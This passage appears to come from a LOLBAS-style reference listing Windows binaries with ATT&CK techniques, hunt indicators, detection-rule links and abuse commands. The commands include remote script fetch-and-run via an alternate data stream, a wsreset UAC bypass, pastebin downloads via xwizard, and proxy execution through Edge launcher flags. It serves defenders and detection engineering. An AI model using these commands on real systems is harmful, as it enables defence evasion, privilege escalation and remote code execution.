- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/WorkFolders.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/WorkFolders.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/WorkFolders.yml`
- **Default Windows Paths:** `C:\Windows\System32\WorkFolders.exe`
- **Key Forensic / Hunt IOCs:** `WorkFolders.exe should not be run on a normal workstation`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_susp_workfolders.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `WorkFolders` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |

### `Wscript.exe` (`yml/OSBinaries/Wscript.yml`)
- **Description:** Used by Windows to execute scripts
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Wscript.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Wscript.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Wscript.yml`
- **Default Windows Paths:** `C:\Windows\System32\wscript.exe`, `C:\Windows\SysWOW64\wscript.exe`
- **Key Forensic / Hunt IOCs:** `Wscript.exe executing code from alternate data streams`; `DotNet CLR libraries loaded into wscript.exe`; `DotNet CLR Usage Log - wscript.exe.log`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wscript_cscript_script_exec.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml), [Elastic](https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml), [Elastic](https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/command_and_control_remote_file_copy_scripts.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `wscript //e:vbscript c:\ads\file.txt:script.vbs` | Execute hidden code to evade defensive counter measures |
| **ADS** | `T1564.004` | `User` | `echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js` | Execute hidden code to evade defensive counter measures |

### `Wsreset.exe` (`yml/OSBinaries/Wsreset.yml`)
- **Description:** Used to reset Windows Store settings according to its manifest file
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Wsreset.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Wsreset.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Wsreset.yml`
- **Default Windows Paths:** `C:\Windows\System32\wsreset.exe`
- **Key Forensic / Hunt IOCs:** `wsreset.exe launching child process other than mmc.exe`; `Creation or modification of the registry value HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`; `Microsoft Defender Antivirus as Behavior:Win32/UACBypassExp.T!gen`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_uac_bypass_wsreset_integrity_level.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_uac_bypass_wsreset.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/registry/registry_event/registry_event_bypass_via_wsreset.yml#), [Splunk](https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/wsreset_uac_bypass.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **UAC Bypass** | `T1548.002` | `User` | `wsreset.exe` | Execute a binary or script as a high-integrity process without a UAC prompt. |

### `wuauclt.exe` (`yml/OSBinaries/Wuauclt.yml`)
- **Description:** Windows Update Client
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Wuauclt.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Wuauclt.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Wuauclt.yml`
- **Default Windows Paths:** `C:\Windows\System32\wuauclt.exe`
- **Key Forensic / Hunt IOCs:** `wuauclt run with a parameter of a DLL path`; `Suspicious wuauclt Internet/network connections`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/network_connection/net_connection_win_wuauclt_network_connection.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_wuauclt.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wuauclt_execution.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `wuauclt.exe /UpdateDeploymentProvider Full_Path_To_DLL /RunHandlerComServer` | Execute dll via attach/detach methods |

### `Xwizard.exe` (`yml/OSBinaries/Xwizard.yml`)
- **Description:** Execute custom class that has been added to the registry or download a file with Xwizard.exe
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Xwizard.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Xwizard.yml`
- **Default Windows Paths:** `C:\Windows\System32\xwizard.exe`, `C:\Windows\SysWOW64\xwizard.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_class_exec_xwizard.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dll_sideload_xwizard.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/execution_com_object_xwizard.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}` | Run a com object created in registry to evade defensive counter measures |
| **Execute** | `T1218` | `User` | `xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}` | Run a com object created in registry to evade defensive counter measures |
| **Download** | `T1105` | `User` | `xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM` | Download file from Internet |

### `msedge_proxy.exe` (`yml/OSBinaries/msedge_proxy.yml`)
- **Description:** Microsoft Edge Browser
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/msedge_proxy.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/msedge_proxy.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/msedge_proxy.yml`
- **Default Windows Paths:** `C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe http://example.com/test.zip` | Download file from the internet |
| **Download** | `T1105` | `User` | `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="C:\\Windows\\System32\\cmd.exe /c curl ipinfo.io/json --output %USERPROFILE%\\Desktop\\test.json &&"` | Download file from the internet |
| **Execute** | `T1218.015` | `User` | `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="C:\\Windows\\System32\\cmd.exe /c ping google.com &&"` | Executes a process under a trusted Microsoft signed binary |

### `msedgewebview2.exe` (`yml/OSBinaries/msedgewebview2.yml`)
- **Description:** msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/msedgewebview2.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/msedgewebview2.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/msedgewebview2.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft\Edge\Application\114.0.1823.43\msedgewebview2.exe`
- **Key Forensic / Hunt IOCs:** `msedgewebview2.exe spawned with any of the following: --gpu-launcher, --utility-cmd-prefix, --renderer-cmd-prefix, --browser-subprocess-path`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.015` | `Low privileges` | `msedgewebview2.exe --no-sandbox --browser-subprocess-path="C:\Windows\System32\calc.exe"` | Proxy execution of binary |
| **Execute** | `T1218.015` | `User` | `msedgewebview2.exe --utility-cmd-prefix="calc.exe"` | Proxy execution of binary |
| **Execute** | `T1218.015` | `User` | `msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher="calc.exe"` | Proxy execution of binary |
| **Execute** | `T1218.015` | `User` | `msedgewebview2.exe --no-sandbox --renderer-cmd-prefix="calc.exe"` | Proxy execution of binary |

### `wt.exe` (`yml/OSBinaries/wt.yml`)
- **Description:** Windows Terminal
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/wt.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/wt.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/wt.yml`
- **Default Windows Paths:** `C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_<version_packageid>\wt.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_windows_terminal_susp_children.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `wt.exe calc.exe` | Use wt.exe as a proxy binary to evade defensive counter-measures |

